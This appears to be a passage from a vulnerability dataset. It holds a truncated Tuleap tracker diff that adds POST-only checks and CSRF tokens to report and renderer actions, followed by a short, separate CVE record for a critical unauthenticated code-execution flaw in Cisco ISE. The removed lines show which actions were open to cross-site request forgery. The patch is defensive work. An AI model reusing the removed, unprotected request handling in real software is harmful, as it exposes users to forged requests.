             case 'rename-renderer':
+                $this->checkReportUpdateRequest($request, $tracker);
                 if ($request->get('new_name') == '') {
                     $GLOBALS['Response']->addFeedback('error', dgettext('tuleap-tracker', 'Renderer name is mandatory.'));
                 } elseif (! $current_user->isAnonymous() && (int) $request->get('renderer') && trim($request->get('new_name'))) {
@@ -1440,6 +1456,7 @@ public function process(Tracker_IDisplayTrackerLayout $layout, $request, $curren
                 ]));
                 break;
             case 'delete-renderer':
+                $this->checkReportUpdateRequest($request, $tracker);
                 if (! $current_user->isAnonymous() && (int) $request->get('renderer')) {
                     $this->report_session->removeRenderer((int) $request->get('renderer'));
                     $this->report_session->setHasChanged();
@@ -1449,6 +1466,7 @@ public function process(Tracker_IDisplayTrackerLayout $layout, $request, $curren
                 }
                 break;
             case 'move-renderer':
+                $this->checkReportUpdateRequest($request, $tracker);
                 if (! $current_user->isAnonymous() && (int) $request->get('renderer')) {
                     if ($request->isAjax()) {
                         $this->report_session->moveRenderer($request->get('tracker_report_renderers'));
@@ -1464,6 +1482,7 @@ public function process(Tracker_IDisplayTrackerLayout $layout, $request, $curren
                 }
                 break;
             case 'add-renderer':
+                $this->checkReportUpdateRequest($request, $tracker);
                 $new_name        = trim($request->get('new_name'));
                 $new_description = trim($request->get('new_description'));
                 $new_type        = trim($request->get('new_type'));
@@ -1476,6 +1495,7 @@ public function process(Tracker_IDisplayTrackerLayout $layout, $request, $curren
                 }
                 break;
             case self::ACTION_SAVE:
+                $this->checkReportUpdateRequest($request, $tracker);
                 Tracker_ReportFactory::instance()->save($this);
                 $this->saveCriteria();
                 $this->saveAdditionalCriteria();
@@ -1489,6 +1509,7 @@ public function process(Tracker_IDisplayTrackerLayout $layout, $request, $curren
                 ]));
                 break;
             case self::ACTION_SAVEAS:
+                $this->checkReportUpdateRequest($request, $tracker);
                 $redirect_to_report_id = $this->id;
                 $report_copy_name      = trim($request->get('report_copy_name'));
                 if ($report_copy_name) {
@@ -1518,15 +1539,15 @@ public function process(Tracker_IDisplayTrackerLayout $layout, $request, $curren
                 ]));
                 break;
             case self::ACTION_DELETE:
+                $this->checkReportUpdateRequest($request, $tracker);
                 $transaction = new DBTransactionExecutorWithConnection(DBFactory::getMainTuleapDBConnection());
                 $transaction->execute(function () {
                     $this->delete();
                 });
-                $GLOBALS['Response']->redirect('?' . http_build_query([
-                    'tracker'   => $this->tracker_id,
-                ]));
-                break;
+                $this->redirectToTracker($tracker);
+                // No break here, redirectToTracker never returns but PHPCS cannot see it
             case self::ACTION_SCOPE:
+                $this->checkReportUpdateRequest($request, $tracker);
                 if ($this->getTracker()->userIsAdmin($current_user) && (! $this->user_id || $this->user_id == $current_user->getId())) {
                     if ($request->exist('report_scope_public')) {
                         $is_scope_public = $request->get('report_scope_public');
@@ -1551,6 +1572,7 @@ public function process(Tracker_IDisplayTrackerLayout $layout, $request, $curren
                 }
                 break;
             case self::ACTION_DEFAULT:
+                $this->checkReportUpdateRequest($request, $tracker);
                 if ($this->getTracker()->userIsAdmin($current_user)) {
                     if ($request->exist('report_default')) {
                         if ($request->get('report_default')) {
@@ -1566,25 +1588,24 @@ public function process(Tracker_IDisplayTrackerLayout $layout, $request, $curren
                 }
                 break;
             case 'store-expert-mode':
+                $this->checkReportUpdateRequest($request, $tracker);
                 if (! $current_user->isAnonymous()) {
-                    if ($request->isPost()) {
-                        $this->report_session->storeExpertMode();
-                        $this->report_session->setHasChanged();
-                        $this->is_in_expert_mode = true;
-                    }
+                    $this->report_session->storeExpertMode();
+                    $this->report_session->setHasChanged();
+                    $this->is_in_expert_mode = true;
                 }
                 break;
             case 'store-normal-mode':
+                $this->checkReportUpdateRequest($request, $tracker);
                 if (! $current_user->isAnonymous()) {
-                    if ($request->isPost()) {
-                        $this->report_session->storeNormalMode();
-                        $this->report_session->setHasChanged();
-                        $this->is_in_expert_mode = false;
-                    }
+                    $this->report_session->storeNormalMode();
+                    $this->report_session->setHasChanged();
+                    $this->is_in_expert_mode = false;
                 }
                 break;
             default:
                 if ($request->exist('tracker_query_submit')) {
+                    $this->checkReportUpdateRequest($request, $tracker);
                     $criteria_values = $request->get('criteria');
                     if (! empty($criteria_values)) {
                         $this->updateCriteriaValues($criteria_values);
@@ -1598,6 +1619,7 @@ public function process(Tracker_IDisplayTrackerLayout $layout, $request, $curren
                     $this->report_session->setHasChanged();
                 }
                 if ($request->exist('tracker_expert_query_submit') && ! $current_user->isAnonymous()) {
+                    $this->checkReportUpdateRequest($request, $tracker);
                     $expert_query = $request->get('expert_query');
                     $this->report_session->storeExpertQuery($expert_query);
 
@@ -1635,6 +1657,29 @@ public function process(Tracker_IDisplayTrackerLayout $layout, $request, $curren
         }
     }
 
+    private function checkReportUpdateRequest(HTTPRequest $request, Tracker $tracker): void
+    {
+        if (! $request->isPost()) {
+            $GLOBALS['Response']->addFeedback(
+                Feedback::ERROR,
+                dgettext('tuleap-tracker', 'The request is not valid.')
+            );
+            $this->redirectToTracker($tracker);
+        }
+        $this->getCSRFTokenReportChange($tracker)->check();
+    }
+
+    private function getCSRFTokenReportChange(Tracker $tracker): CSRFSynchronizerToken
+    {
+        return new CSRFSynchronizerToken($tracker->getUri());
+    }
+
+    private function redirectToTracker(Tracker $tracker): never
+    {
+        $GLOBALS['Response']->redirect($tracker->getUri());
+        exit;
+    }
+
     public function setDefaultReport(): void
     {
         $default_report = Tracker_ReportFactory::instance()->getDefaultReportByTrackerId($this->tracker_id);
diff --git a/plugins/tracker/include/Tracker/Report/Tracker_Report_HeaderInReportPresenter.php b/plugins/tracker/include/Tracker/Report/Tracker_Report_HeaderInReportPresenter.php
index 013de89ac58..66e745ebfc0 100644
--- a/plugins/tracker/include/Tracker/Report/Tracker_Report_HeaderInReportPresenter.php
+++ b/plugins/tracker/include/Tracker/Report/Tracker_Report_HeaderInReportPresenter.php
@@ -79,6 +79,8 @@ class Tracker_Report_HeaderInReportPresenter
      */
     public $warnings;
 
+    public readonly CSRFSynchronizerToken $csrf_token;
+
     public function __construct(
         string $browse_instructions,
         string $title,
@@ -103,9 +105,11 @@ public function __construct(
         $this->has_changed_classname = $has_changed_classname;
         $this->report_name           = $report->getName();
         $this->warnings              = $warnings;
-        $this->item_name             = $report->getTracker()->getItemName();
+        $tracker                     = $report->getTracker();
+        $this->item_name             = $tracker->getItemName();
         $this->is_user_anonymous     = $user->isAnonymous();
-        $this->artifact_creation_url = $report->getTracker()->getSubmitUrl();
+        $this->artifact_creation_url = $tracker->getSubmitUrl();
+        $this->csrf_token            = new CSRFSynchronizerToken($tracker->getUri());
     }
 
     public function has_browse_instructions(): bool
diff --git a/plugins/tracker/include/Tracker/Report/Tracker_Report_Renderer_Table.php b/plugins/tracker/include/Tracker/Report/Tracker_Report_Renderer_Table.php
index 55a99f52490..fcade77a610 100644
--- a/plugins/tracker/include/Tracker/Report/Tracker_Report_Renderer_Table.php
+++ b/plugins/tracker/include/Tracker/Report/Tracker_Report_Renderer_Table.php
@@ -689,23 +689,26 @@ private function fetchSort(): string
         $html         = '<div class="tracker_report_table_sortby_panel">';
         $sort_columns = SortWithIntegrityChecked::getSortOnUsedFields($this->getSort());
         if (count($sort_columns) > 0) {
-            $html .= dgettext('tuleap-tracker', 'Sort by:');
-            $html .= ' ';
-            $sort  = [];
+            $html      .= dgettext('tuleap-tracker', 'Sort by:');
+            $html      .= ' ';
+            $sort       = [];
+            $csrf_token = $this->getCSRFTokenReportChange($this->report->getTracker());
             foreach ($sort_columns as $row) {
-                $sort[] = '<a id="tracker_report_table_sort_by_' . $purifier->purify($row['field_id']) . '"
-                              href="?' .
-                    $purifier->purify(http_build_query([
-                        'report' => $this->report->id,
-                        'renderer' => $this->id,
-                        'func' => 'renderer',
-                        'renderer_table[sort_by]' => $row['field_id'],
-                    ])) . '">' .
-                    $purifier->purify($row['field']->getLabel()) .
-                    $this->getSortIcon($row['is_desc']) .
-                    '</a>';
-            }
-            $html .= implode(' <i class="fa fa-angle-right"></i> ', $sort);
+                $sort[] = '<form method="post">';
+                $sort[] = $csrf_token->fetchHTMLInput();
+                $sort[] = '<input type="hidden" name="func" value="renderer" />';
+                $sort[] = '<input type="hidden" name="report" value="' . $purifier->purify($this->report->id) . '" />';
+                $sort[] = '<input type="hidden" name="renderer" value="' . $purifier->purify($this->id) . '" />';
+                $sort[] = '<input type="hidden" name="renderer_table[sort_by]" value="' . $purifier->purify($row['field_id']) . '" />';
+                $sort[] = '<button type="submit" class="btn-link" id="tracker_report_table_sort_by_' . $purifier->purify($row['field_id']) . '">';
+                $sort[] = $purifier->purify($row['field']->getLabel()) .
+                    $this->getSortIcon($row['is_desc']);
+                $sort[] = '</button>';
+                $sort[] = '</form>';
+                $sort[] = ' <i class="fa fa-angle-right"></i> ';
+            }
+            array_pop($sort);
+            $html .= implode('', $sort);
         }
         $html .= '</div>';
         return $html;
@@ -758,6 +761,7 @@ private function fetchNextPrevious($total_rows, $offset, $report_can_be_modified
             if ($report_can_be_modified) {
                 $chunk .= '<div class="input-append">';
                 $chunk .= '<input id="renderer_table_chunksz_input" type="text" name="renderer_table[chunksz]" size="1" maxlength="5" value="' . (int) $this->chunksz . '" />';
+                $chunk .= $this->getCSRFTokenReportChange($this->report->getTracker())->fetchHTMLInput();
                 $chunk .= '<button type="submit" class="btn btn-small">Ok</button> ';
                 $chunk .= '</div> ';
             } else {
@@ -884,6 +888,12 @@ private function fetchTHead($extracolumn = 1, $only_one_column = null, $with_sor
             $html .= ' id="tracker_report_table' . $id_suffix . '"  width="100%" data-test="artifact-report-table"';
         }
 
+        $csrf_token = $this->getCSRFTokenReportChange($this->getReport()->getTracker());
+
+        $purifier = Codendi_HTMLPurifier::instance();
+
+        $html .= ' data-challenge="' . $purifier->purify($csrf_token->getToken()) . '"';
+
         $classnames = '';
         if ($with_sort_links && ! $current_user->isAnonymous()) {
             $classnames .= ' reorderable resizable';
@@ -921,13 +931,7 @@ private function fetchTHead($extracolumn = 1, $only_one_column = null, $with_sor
             $html .= '<th></th>';
         }
 
-        $ff  = $this->getFieldFactory();
-        $url = '?' . http_build_query([
-            'report'                  => $this->report->id,
-            'renderer'                => $this->id,
-            'func'                    => 'renderer',
-            'renderer_table[sort_by]' => '',
-        ]);
+        $ff = $this->getFieldFactory();
         if ($use_data_from_db) {
             $all_columns = $this->reorderColumnsByRank($this->getColumnsFromDb());
         } else {
@@ -948,7 +952,6 @@ private function fetchTHead($extracolumn = 1, $only_one_column = null, $with_sor
         }
         $sort_columns = SortWithIntegrityChecked::getSort($this->getSort($store_in_session));
 
-        $purifier               = Codendi_HTMLPurifier::instance();
         $type_presenter_factory = $this->getTypePresenterFactory();
         foreach ($columns as $key => $column) {
             if ($column['width']) {
@@ -986,8 +989,14 @@ private function fetchTHead($extracolumn = 1, $only_one_column = null, $with_sor
                 }
                 $label = $purifier->purify($field_label);
 
+                $sort_settings = [
+                    'report'                  => $this->report->id,
+                    'renderer'                => $this->id,
+                    'func'                    => 'renderer',
+                ];
+
                 if ($with_sort_links) {
-                    $sort_url = $url . $column['field']->id;
+                    $sort_settings['renderer_table[sort_by]'] = $column['field']->id;
 
                     $html .= '<table width="100%" border="0" cellpadding="0" cellspacing="0"><tbody><tr>';
 
@@ -997,9 +1006,15 @@ private function fetchTHead($extracolumn = 1, $only_one_column = null, $with_sor
 
                     $html .= '<td class="tracker_report_table_column_title">';
                     if (! isset($column['artlink_nature']) && $column['field']->canBeUsedToSortReport()) {
-                        $html .= '<a href="' . $purifier->purify($sort_url) . '">';
+                        $html .= '<form method="post">';
+                        $html .= $csrf_token->fetchHTMLInput();
+                        foreach ($sort_settings as $sort_setting_name => $sort_setting_value) {
+                            $html .= '<input type="hidden" name="' . $purifier->purify($sort_setting_name) . '" value="' . $purifier->purify($sort_setting_value) . '"/>';
+                        }
+                        $html .= '<button class="btn-link" type="submit">';
                         $html .= $label;
-                        $html .= '</a>';
+                        $html .= '</button>';
+                        $html .= '</form>';
                     } else {
                         $html .= $label;
                     }
@@ -1008,9 +1023,15 @@ private function fetchTHead($extracolumn = 1, $only_one_column = null, $with_sor
                     if (! isset($column['artlink_nature']) && isset($sort_columns[$key])) {
                         $html .= '<td class="tracker_report_table_column_caret">';
                         if ($column['field']->canBeUsedToSortReport()) {
-                            $html .= '<a href="' . $purifier->purify($sort_url) . '">';
+                            $html .= '<form method="post">';
+                            $html .= $csrf_token->fetchHTMLInput();
+                            foreach ($sort_settings as $sort_setting_name => $sort_setting_value) {
+                                $html .= '<input type="hidden" name="' . $purifier->purify($sort_setting_name) . '" value="' . $purifier->purify($sort_setting_value) . '"/>';
+                            }
+                            $html .= '<button class="btn-link" type="submit">';
                             $html .= $this->getSortIcon($sort_columns[$column['field']->getId()]['is_desc']);
-                            $html .= '</a>';
+                            $html .= '</button>';
+                            $html .= '</form>';
                         } else {
                             $warning_message = dgettext(
                                 'tuleap-tracker',
@@ -1549,26 +1570,35 @@ private function fetchAddAggregatesButton(
             return;
         }
 
-        $html  = '';
-        $html .= '<div class="btn-group">';
-        $html .= '<a
+        $html       = '';
+        $html      .= '<div class="btn-group">';
+        $html      .= '<a
             class="btn btn-mini dropdown-toggle"
             title="' . dgettext('tuleap-tracker', 'Toggle an aggregate function') . '"
             data-toggle="dropdown">';
-        $html .= '<i class="fa fa-plus"></i> ';
-        $html .= '<span class="caret"></span>';
-        $html .= '</a>';
-        $html .= '<ul class="dropdown-menu ' . ($is_first ? '' : 'pull-right') . '">';
+        $html      .= '<i class="fa fa-plus"></i> ';
+        $html      .= '<span class="caret"></span>';
+        $html      .= '</a>';
+        $html      .= '<ul class="dropdown-menu ' . ($is_first ? '' : 'pull-right') . '">';
+        $csrf_token = $this->getCSRFTokenReportChange($this->report->getTracker());
+        $purifier   = Codendi_HTMLPurifier::instance();
         foreach ($aggregate_functions as $function) {
             $is_used = isset($used_aggregates[$field->getId()]) && in_array($function, $used_aggregates[$field->getId()]);
-            $url     = $this->getAggregateURL($field, $function);
             $html   .= '<li>';
-            $html   .= '<a href="' . $url . '">';
+
+            $html .= '<form method="post" action="' . TRACKER_BASE_URL . '">';
+            $html .= $csrf_token->fetchHTMLInput();
+            $html .= '<input type="hidden" name="func" value="renderer"/>';
+            $html .= '<input type="hidden" name="report" value="' . $purifier->purify($this->report->getId()) . '"/>';
+            $html .= '<input type="hidden" name="renderer" value="' . $purifier->purify($this->getId()) . '"/>';
+            $html .= '<input type="hidden" name="renderer_table[add_aggregate][' . $purifier->purify($field->getId()) .  ']" value="' . $purifier->purify($function) . '"/>';
+            $html .= '<button class="btn-link" type="submit">';
             if ($is_used) {
                 $html .= '<i class="fa fa-check"></i> ';
             }
-            $html .= $this->getAggregateLabel($function);
-            $html .= '</a>';
+            $html .= $purifier->purify($this->getAggregateLabel($function));
+            $html .= '</button>';
+            $html .= '</form>';
             $html .= '</li>';
         }
         $html .= '</ul>';
@@ -1577,22 +1607,6 @@ class="btn btn-mini dropdown-toggle"
         return $html;
     }
 
-    private function getAggregateURL($field, $function)
-    {
-        $field_id = $field->getId();
-        $params   = [
-            'func'       => 'renderer',
-            'report'     => $this->report->getId(),
-            'renderer'   => $this->getId(),
-            'renderer_table' => [
-                'add_aggregate' => [
-                    $field_id => $function,
-                ],
-            ],
-        ];
-        return TRACKER_BASE_URL . '/?' . http_build_query($params);
-    }
-
     private function fetchAggregatesExtraColumns($extracolumn, $only_one_column, PFUser $current_user)
     {
         $html        = '';
@@ -1837,6 +1851,7 @@ public function processRequest(TrackerManager $tracker_manager, $request, PFUser
         if ($renderer_parameters && is_array($renderer_parameters)) {
             //Update the chunksz parameter
             if (isset($renderer_parameters['chunksz'])) {
+                $this->checkReportRendererUpdateRequest($request);
                 $new_chunksz = abs((int) $renderer_parameters['chunksz']);
                 if ($new_chunksz && ($this->chunksz != $new_chunksz)) {
                     $this->report_session->set("{$this->id}.chunksz", $new_chunksz);
@@ -1847,6 +1862,7 @@ public function processRequest(TrackerManager $tracker_manager, $request, PFUser
 
             //Add an aggregate function
             if (isset($renderer_parameters['add_aggregate']) && is_array($renderer_parameters['add_aggregate'])) {
+                $this->checkReportRendererUpdateRequest($request);
                 $column_id = key($renderer_parameters['add_aggregate']);
                 $agg       = current($renderer_parameters['add_aggregate']);
                 //Is the field used by the tracker?
@@ -1882,6 +1898,7 @@ public function processRequest(TrackerManager $tracker_manager, $request, PFUser
 
             //toggle a sort column
             if (isset($renderer_parameters['sort_by'])) {
+                $this->checkReportRendererUpdateRequest($request);
                 $sort_by = (int) $renderer_parameters['sort_by'];
                 if ($sort_by) {
                     if ($field = $ff->getUsedFormElementById($sort_by)) {
@@ -1920,6 +1937,7 @@ public function processRequest(TrackerManager $tracker_manager, $request, PFUser
 
             //Reset sort
             if (isset($renderer_parameters['resetsort'])) {
+                $this->checkReportRendererUpdateRequest($request);
                 //Drop existing sort
                 $this->report_session->remove("{$this->id}", 'sort');
                 $this->report_session->setHasChanged();
@@ -1927,6 +1945,7 @@ public function processRequest(TrackerManager $tracker_manager, $request, PFUser
 
             //Toggle multisort
             if (isset($renderer_parameters['multisort'])) {
+                $this->checkReportRendererUpdateRequest($request);
                 $sort_fields     = $this->getSort();
                 $keep_it         = key($sort_fields);
                 $this->multisort = ! $this->multisort;
@@ -1944,6 +1963,7 @@ public function processRequest(TrackerManager $tracker_manager, $request, PFUser
 
             //Remove column
             if (isset($renderer_parameters['remove-column'])) {
+                $this->checkReportRendererUpdateRequest($request);
                 $column_id = $renderer_parameters['remove-column'];
                 if ($column_id) {
                     $columns = $this->getColumns();
@@ -1964,6 +1984,7 @@ public function processRequest(TrackerManager $tracker_manager, $request, PFUser
 
             //Add column
             if (isset($renderer_parameters['add-column']['field-id'])) {
+                $this->checkReportRendererUpdateRequest($request);
                 if ($field_id = (int) $renderer_parameters['add-column']['field-id']) {
                     if ($field = $ff->getUsedFormElementById($field_id)) {
                         $columns      = $this->getColumns();
@@ -2023,6 +2044,7 @@ public function processRequest(TrackerManager $tracker_manager, $request, PFUser
 
             //Reorder columns
             if (isset($renderer_parameters['reorder-column']) && is_array($renderer_parameters['reorder-column'])) {
+                $this->checkReportRendererUpdateRequest($request);
                 $column_id    = key($renderer_parameters['reorder-column']);
                 $new_position = (int) current($renderer_parameters['reorder-column']);
                 if ($column_id) {
@@ -2073,6 +2095,7 @@ public function processRequest(TrackerManager $tracker_manager, $request, PFUser
 
             //Resize column
             if (isset($renderer_parameters['resize-column']) && is_array($renderer_parameters['resize-column'])) {
+                $this->checkReportRendererUpdateRequest($request);
                 foreach ($renderer_parameters['resize-column'] as $column_id => $new_width) {
                     $new_width = (int) $new_width;
                     if ($column_id) {
@@ -2089,6 +2112,7 @@ public function processRequest(TrackerManager $tracker_manager, $request, PFUser
 
             // Define format of column
             if (isset($renderer_parameters['configure-column']) && is_array($renderer_parameters['configure-column'])) {
+                $this->checkReportRendererUpdateRequest($request);
                 foreach ($renderer_parameters['configure-column'] as $column_id => $format) {
                     if ($column_id) {
                         $columns = $this->getColumns();
@@ -2112,6 +2136,30 @@ public function processRequest(TrackerManager $tracker_manager, $request, PFUser
         }
     }
 
+    private function checkReportRendererUpdateRequest(HTTPRequest $request): void
+    {
+        $tracker = $this->getReport()->getTracker();
+        if (! $request->isPost()) {
+            $GLOBALS['Response']->addFeedback(
+                Feedback::ERROR,
+                dgettext('tuleap-tracker', 'The request is not valid.')
+            );
+            $this->redirectToTracker($tracker);
+        }
+        $this->getCSRFTokenReportChange($tracker)->check();
+    }
+
+    private function getCSRFTokenReportChange(Tracker $tracker): CSRFSynchronizerToken
+    {
+        return new CSRFSynchronizerToken($tracker->getUri());
+    }
+
+    private function redirectToTracker(Tracker $tracker): never
+    {
+        $GLOBALS['Response']->redirect($tracker->getUri());
+        exit;
+    }
+
     private function addColumnsRequiredForSorting(array $columns): array
     {
         $sort = $this->getSort();
@@ -2586,32 +2634,34 @@ private function fetchViewButtons($report_can_be_modified, PFUser $current_user)
         $html .= '<div id="tracker_report_renderer_view_controls">';
         if ($this->sortHasUsedField()) {
             //reset sort
-            $reset_sort_params = [
-                'report'                    => $this->report->id,
-                'renderer'                  => $this->id,
-                'func'                      => 'renderer',
-                'renderer_table[resetsort]' => 1,
-            ];
-            $html             .= '<div class="btn-group"><a class="btn btn-mini" href="?' . http_build_query($reset_sort_params) . '">'
-                . '<i class="fa fa-reply"></i> '
-                . dgettext('tuleap-tracker', 'Reset sort')
-                . '</a></div> ';
+            $csrf_token = $this->getCSRFTokenReportChange($this->report->getTracker());
+            $purifier   = Codendi_HTMLPurifier::instance();
+            $html      .= '<form class="btn-group" method="post">';
+            $html      .= $csrf_token->fetchHTMLInput();
+            $html      .= '<input type="hidden" name="func" value="renderer"/>';
+            $html      .= '<input type="hidden" name="report" value="' . $purifier->purify($this->report->getId()) . '"/>';
+            $html      .= '<input type="hidden" name="renderer" value="' . $purifier->purify($this->getId()) . '"/>';
+            $html      .= '<input type="hidden" name="renderer_table[resetsort]" value="1"/>';
+            $html      .= '<button type="submit" class="btn btn-mini">';
+            $html      .= '<i class="fa fa-reply"></i> ' . $purifier->purify(dgettext('tuleap-tracker', 'Reset sort'));
+            $html      .= '</button>';
+            $html      .= '</form>';
 
             //toggle multisort
-            $multisort_params = [
-                'report'                    => $this->report->id,
-                'renderer'                  => $this->id,
-                'func'                      => 'renderer',
-                'renderer_table[multisort]' => 1,
-            ];
-            $multisort_label  = dgettext('tuleap-tracker', 'Enable multisort');
+            $multisort_label = dgettext('tuleap-tracker', 'Enable multisort');
             if ($this->multisort) {
                 $multisort_label = dgettext('tuleap-tracker', 'Disable multisort');
             }
-            $html .= '<div class="btn-group"><a class="btn btn-mini" href="?' . http_build_query($multisort_params) . '">'
-                . '<i class="fa fa-sort"></i> '
-                . $multisort_label
-                . '</a></div> ';
+            $html .= '<form class="btn-group" method="post">';
+            $html .= $csrf_token->fetchHTMLInput();
+            $html .= '<input type="hidden" name="func" value="renderer"/>';
+            $html .= '<input type="hidden" name="report" value="' . $purifier->purify($this->report->getId()) . '"/>';
+            $html .= '<input type="hidden" name="renderer" value="' . $purifier->purify($this->getId()) . '"/>';
+            $html .= '<input type="hidden" name="renderer_table[multisort]" value="1"/>';
+            $html .= '<button type="submit" class="btn btn-mini">';
+            $html .= '<i class="fa fa-sort"></i> ' . $purifier->purify($multisort_label);
+            $html .= '</button>';
+            $html .= '</form>';
         }
 
         if ($report_can_be_modified && ! $current_user->isAnonymous()) {
diff --git a/plugins/tracker/include/Tracker/Tracker.php b/plugins/tracker/include/Tracker/Tracker.php
index db8a86207f9..495fa7979c6 100644
--- a/plugins/tracker/include/Tracker/Tracker.php
+++ b/plugins/tracker/include/Tracker/Tracker.php
@@ -1662,6 +1662,7 @@ public function displayMasschangeForm(Tracker_IDisplayTrackerLayout $layout, PFU
                 $this->displayRulesAsJavascript(),
                 $event->getExternalActions(),
                 ! $this->isNotificationStopped(),
+                new CSRFSynchronizerToken($this->getUri()),
             )
         );
 
diff --git a/plugins/tracker/scripts/legacy/src/ReorderColumns.js b/plugins/tracker/scripts/legacy/src/ReorderColumns.js
index 7283878788f..74fd47cfd64 100644
--- a/plugins/tracker/scripts/legacy/src/ReorderColumns.js
+++ b/plugins/tracker/scripts/legacy/src/ReorderColumns.js
@@ -88,6 +88,7 @@ codendi.ReorderColumns = Class.create({
                     var parameters = {
                             func: "renderer",
                             renderer: renderer_id,
+                            challenge: cell.closest("table").readAttribute("data-challenge"),
                         },
                         param_name =
                             "renderer_table[reorder-column][" +
diff --git a/plugins/tracker/scripts/legacy/src/TrackerReports.js b/plugins/tracker/scripts/legacy/src/TrackerReports.js
index c86e9336c2b..6d8201ced12 100644
--- a/plugins/tracker/scripts/legacy/src/TrackerReports.js
+++ b/plugins/tracker/scripts/legacy/src/TrackerReports.js
@@ -88,6 +88,7 @@ codendi.tracker.report.table.saveColumnsWidth = function (table, onComplete) {
     var parameters = {
         func: "renderer",
         renderer: $("tracker_report_renderer_current").readAttribute("data-renderer-id"),
+        challenge: table.readAttribute("data-challenge"),
     };
     var cells = table.rows[0].cells;
     var n = cells.length;
@@ -163,6 +164,7 @@ codendi.tracker.report.table.AddRemoveColumn = Class.create({
      * Add a column to the table
      */
     add: function (dropdown, li) {
+        const challenge = li.readAttribute("data-challenge");
         var column_id = li.readAttribute("data-column-id"),
             field_id = li.readAttribute("data-field-id"),
             artlink_type = li.readAttribute("data-field-artlink-type"),
@@ -188,6 +190,7 @@ codendi.tracker.report.table.AddRemoveColumn = Class.create({
                         "data-renderer-id",
                     ),
                     "renderer_table[add-column][field-id]": field_id,
+                    challenge,
                 };
             if (artlink_type !== null) {
                 parameters["renderer_table[add-column][artlink-type]"] = artlink_type;
@@ -247,6 +250,7 @@ codendi.tracker.report.table.AddRemoveColumn = Class.create({
      * remove a column to the table
      */
     remove: function (dropdown, li) {
+        const challenge = li.readAttribute("data-challenge");
         var column_id = li.readAttribute("data-column-id"),
             field_id = li.readAttribute("data-field-id");
         if ($("tracker_report_table_sort_by_" + field_id)) {
@@ -290,6 +294,7 @@ codendi.tracker.report.table.AddRemoveColumn = Class.create({
                             "data-renderer-id",
                         ),
                         "renderer_table[remove-column]": column_id,
+                        challenge,
                     },
                     onSuccess: function () {
                         $$("th[data-column-id=" + column_id + "]").each(function (col) {
@@ -336,6 +341,7 @@ codendi.tracker.report.AddRemoveCriteria = Class.create({
         if (!this.request_sent) {
             this.request_sent = true;
             var field_id = li.readAttribute("data-field-id");
+            const challenge = li.readAttribute("data-challenge");
             if ($("tracker_report_crit_" + field_id)) {
                 $$(".tracker_report_crit_" + field_id).invoke("show");
                 $("tracker_report_crit_" + field_id).show();
@@ -345,6 +351,7 @@ codendi.tracker.report.AddRemoveCriteria = Class.create({
                     parameters: {
                         func: "add-criteria",
                         field: field_id,
+                        challenge,
                     },
                     onComplete: function () {
                         self.request_sent = false;
@@ -355,6 +362,7 @@ codendi.tracker.report.AddRemoveCriteria = Class.create({
                     parameters: {
                         func: "add-criteria",
                         field: field_id,
+                        challenge,
                     },
                     onComplete: function () {
                         self.request_sent = false;
@@ -389,10 +397,12 @@ codendi.tracker.report.AddRemoveCriteria = Class.create({
      */
     remove: function (dropdown, li) {
         var field_id = li.readAttribute("data-field-id");
+        const challenge = li.readAttribute("data-challenge");
         new Ajax.Request(location.href, {
             parameters: {
                 func: "remove-criteria",
                 field: field_id,
+                challenge,
             },
             onSuccess: function () {
                 $$(".tracker_report_crit_" + field_id).invoke("hide");
@@ -422,11 +432,14 @@ codendi.tracker.report.loadAdvancedCriteria = function (element) {
                 .next()
                 .down("label")
                 .htmlFor.match(/_(\d+)$/)[1];
+            const form = li.closest("form");
+            const form_data = new FormData(form);
             //eslint-disable-next-line @typescript-eslint/no-unused-vars
             var req = new Ajax.Updater(li, location.href, {
                 parameters: {
                     func: "toggle-advanced",
                     field: field_id,
+                    challenge: form_data.get("challenge"),
                 },
                 onComplete: function (transport) {
                     //Force refresh of decorators and calendar
diff --git a/plugins/tracker/scripts/legacy/src/tracker-report-type-column.js b/plugins/tracker/scripts/legacy/src/tracker-report-type-column.js
index be10aff5ec6..40207c4b0e7 100644
--- a/plugins/tracker/scripts/legacy/src/tracker-report-type-column.js
+++ b/plugins/tracker/scripts/legacy/src/tracker-report-type-column.js
@@ -46,7 +46,19 @@
             format = "";
         }
 
-        content += '<form action="#" method="get" class="save-type-column-format">';
+        content += '<form action="#" method="post" class="save-type-column-format">';
+
+        for (const table of cog.parents("table")) {
+            const challenge = table.readAttribute("data-challenge");
+            if (challenge !== null) {
+                const input = document.createElement("input");
+                input.type = "hidden";
+                input.name = "challenge";
+                input.value = challenge;
+                content += input.outerHTML;
+                break;
+            }
+        }
 
         content +=
             '<p class="alert alert-danger">' +
@@ -100,7 +112,7 @@
 
         var form = $(this);
 
-        $.get(codendi.tracker.base_url, form.serialize())
+        $.post(codendi.tracker.base_url, form.serialize())
             .done(function () {
                 location.reload();
             })
diff --git a/plugins/tracker/scripts/report/src/expert-mode.js b/plugins/tracker/scripts/report/src/expert-mode.js
index fb3358fc9e4..666541f67c2 100644
--- a/plugins/tracker/scripts/report/src/expert-mode.js
+++ b/plugins/tracker/scripts/report/src/expert-mode.js
@@ -59,17 +59,32 @@ function initializeTrackerReportQuery() {
 
         codeMirrorifyQueryArea();
 
-        sendRequestNewMode("store-expert-mode");
+        sendRequestNewMode(
+            "store-expert-mode",
+            getFormChallengeAssociatedWithButton(tracker_report_expert_query_button),
+        );
     });
 
     tracker_report_normal_query_button.addEventListener("click", () => {
         tracker_report_normal_query.classList.remove("tracker-report-query-undisplayed");
         tracker_report_expert_query.classList.add("tracker-report-query-undisplayed");
 
-        sendRequestNewMode("store-normal-mode");
+        sendRequestNewMode(
+            "store-normal-mode",
+            getFormChallengeAssociatedWithButton(tracker_report_normal_query_button),
+        );
     });
 }
 
+function getFormChallengeAssociatedWithButton(button) {
+    if (!(button instanceof HTMLButtonElement)) {
+        return "";
+    }
+
+    const form_data = new FormData(button.form);
+    return form_data.get("challenge");
+}
+
 function initializeTrackerReportAllowedFields() {
     const tracker_report_expert_allowed_fields = document.getElementById("allowed-fields");
     if (!tracker_report_expert_allowed_fields) {
@@ -81,14 +96,14 @@ function initializeTrackerReportAllowedFields()
... [truncated]

================================================================================


CVE ID: CVE-2025-20281
Published: 2025-06-25T16:15:26.017
Modified: 2025-07-30T19:24:26.480
CVSS Score: 10.0 (CRITICAL) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H

CWE Categories:
  - CWE-74: CWE-74

Description:
A vulnerability in a specific API of Cisco ISE and Cisco ISE-PIC could allow an unauthenticated, remote attacker to execute arbitrary code on the underlying operating system as root. The attacker does not require any valid credentials to exploit this vulnerability.

